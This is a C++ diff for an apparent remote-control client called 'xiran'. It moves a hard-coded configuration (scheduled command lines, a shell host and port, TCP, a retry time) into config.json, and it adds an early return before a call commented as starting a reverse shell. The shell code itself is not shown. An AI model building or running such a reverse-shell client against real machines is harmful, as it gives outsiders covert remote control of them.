@@ -12,6 +12,8 @@
 #include "shell.hpp"
 #include <vector>
 #include "config.hpp"
+#include <fstream>
+#include <fcntl.h>
 
 constexpr auto xiran_strlen(const char* str)
 {
@@ -72,10 +74,36 @@ void get_config()
 
     //功能暂未实现，使用固定配置 
 
-    const char config[] = "{\"version\":\"1.0\",\"cmdlines\":[\"cmd1\",\"cmd2\"],\"cmdIntervaltime\":123,\"Listening_port\":-1,\"updata_time\":-1,\"enable_shell\":true,\"shell_host\":\"127.0.0.1\",\"shell_port\":\"1234\",\"shell_protocol\":\"TCP\",\"retry_time\":10}";
+    //const char config[] = "{\"version\":\"1.0\",\"cmdlines\":[\"cmd1\",\"cmd2\"],\"cmdIntervaltime\":123,\"Listening_port\":-1,\"updata_time\":-1,\"enable_shell\":true,\"shell_host\":\"127.0.0.1\",\"shell_port\":\"1234\",\"shell_protocol\":\"TCP\",\"retry_time\":10}";
+    
+    // 打开文件
+    std::ifstream file("config.json", std::ios::in | std::ios::binary | std::ios::ate);
+    if (!file.is_open()) {
+        throw "can't open config.json";
+    }
+    
+    // 获取文件大小
+    std::streampos size = file.tellg();
+    file.seekg(0, std::ios::beg);
+    
+    // 创建一个字符串来保存文件内容
+    std::string fileContent(size, '\0');
+    
+    // 读取文件内容到字符串
+    file.read(&fileContent[0], size);
+    file.close();
+
+    #ifdef DEBUG
+        std::cout<<fileContent<<"\n";
+    #endif
 
     //解析配置文件
-    analysis_xiran_config(config);
+    analysis_xiran_config(fileContent.c_str());
+
+
+    #ifdef DEBUG
+        puts("config analysis ok");
+    #endif
 
 }
 
@@ -92,6 +120,8 @@ int main()
     //开启文件获取线程，防止文件下载出错影响主线程
     auto th = std::thread(start_file_get);
     th.join();//之后的定时任务可能会使用到下载的文件，所以等待此线程
+
+    return 0;
 
     //启动反弹shell
     shell_start(thread_vec);
